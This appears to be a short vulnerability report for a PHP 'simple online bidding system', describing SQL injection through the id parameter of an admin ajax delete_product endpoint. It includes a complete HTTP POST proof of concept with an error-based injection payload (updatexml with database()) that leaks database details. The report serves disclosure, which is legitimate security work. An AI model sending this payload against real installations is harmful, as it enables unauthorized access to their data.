## Sourcecoster simple online bidding system has sql injection vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

## Vulnerability file
/simple-online-bidding-system/bidding/admin/ajax.php?action=delete_product

## Vulnerability analysis
<img width="1214" alt="image" src="https://github.com/user-attachments/assets/0a1f5e50-9e64-4f56-acac-b96f05c570aa">

<img width="1138" alt="image" src="https://github.com/user-attachments/assets/fe36c648-7178-4bf4-86f0-c386581b27f1">


## describe
There is an unrestricted SQL injection attack in the simple online bidding system, and the controllable parameter is id. An attacker can obtain sensitive server information through this vulnerability.

POC
```
POST /simple-online-bidding-system/bidding/admin/ajax.php?action=delete_product HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 59
Origin: http://localhost
Connection: close
Referer: http://localhost/simple-online-bidding-system/bidding/admin/index.php?page=products
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=4%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q
```

<img width="1202" alt="image" src="https://github.com/user-attachments/assets/c44bce99-b441-4138-b042-cff0468b68ed">







